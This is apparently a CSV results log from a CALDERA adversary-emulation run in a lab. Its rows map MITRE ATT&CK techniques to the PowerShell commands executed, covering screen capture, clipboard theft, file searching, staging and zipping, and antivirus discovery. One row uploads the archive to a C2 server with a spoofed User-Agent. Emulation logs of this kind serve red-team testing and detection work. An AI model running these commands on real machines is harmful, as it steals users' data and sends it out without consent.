Operation,Agent,Ability,Technique_ID,Technique_Name,Tactic,Status,Command,Executor
smoke_test3,aojmqr,Screen Capture,T1113,Screen Capture,collection,Success,"$loadResult = [Reflection.Assembly]::LoadWithPartialName(""System.Drawing"");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = ""$HOME\Desktop\screenshot.png"";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;",psh
smoke_test3,aojmqr,Copy Clipboard,T1115,Clipboard Data,collection,Success,Get-Clipboard -raw,psh
smoke_test3,aojmqr,Create local staging directory,T1074.001,Data Staged: Local Data Staging,collection,Success,"New-Item -Path ""."" -Name ""staged"" -ItemType ""directory"" -Force | foreach {$_.FullName} | Select-Object",psh
smoke_test3,aojmqr,Find files,T1005,Data from Local System,collection,Success,Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;,psh
smoke_test3,aojmqr,Find files,T1005,Data from Local System,collection,Success,Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;,psh
smoke_test3,aojmqr,Find files,T1005,Data from Local System,collection,Success,Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;,psh
smoke_test3,aojmqr,Stage sensitive files,T1074.001,Data Staged: Local Data Staging,collection,Success,Copy-Item C:\Users\shank\Desktop\screenshot.png C:\Users\shank\Desktop\calderalab\staged,psh
smoke_test3,aojmqr,Compress staged directory,T1560.001,Archive Collected Data: Archive via Utility,collection,Success,Compress-Archive -Path C:\Users\shank\Desktop\calderalab\staged -DestinationPath C:\Users\shank\Desktop\calderalab\staged.zip -Force;sleep 1; ls C:\Users\shank\Desktop\calderalab\staged.zip | foreach {$_.FullName} | select,psh
smoke_test3,aojmqr,Exfil staged directory,T1041,Exfiltration Over C2 Channel,exfiltration,Success,"$ErrorActionPreference = 'Stop';$fieldName = ""C:\Users\shank\Desktop\calderalab\staged.zip"";$filePath = ""C:\Users\shank\Desktop\calderalab\staged.zip"";$url = ""http://192.168.56.101:8888/file/upload"";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-aojmqr');$client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();",psh
smoke_test3,aojmqr,Discover antivirus programs,T1518.001,Software Discovery: Security Software Discovery,discovery,Success,wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value,psh
